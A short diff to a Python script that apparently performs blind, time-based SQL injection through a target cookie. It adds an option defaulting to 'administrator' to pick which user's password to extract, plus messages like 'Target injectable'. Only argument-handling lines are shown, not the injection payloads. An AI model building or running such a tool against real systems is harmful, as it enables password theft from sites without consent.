@@ -121,6 +121,8 @@ if __name__ == '__main__':
                         help='target cookie to inject')
     parser.add_argument('--threshold', type=int, default=10,
                         help='sleep value')
+    parser.add_argument('--user', default="administrator",
+                        help='User to get password')
     args = parser.parse_args()
 
     print('''
@@ -147,6 +149,8 @@ if __name__ == '__main__':
         print('Injection Failed')
         exit(0)
     print("[+] Target injectable")
+    username = args.user
+    print("Searching for user {0}".format(username))
     if not user_found(args):
         print('user not found. Try again!')
         exit(0)
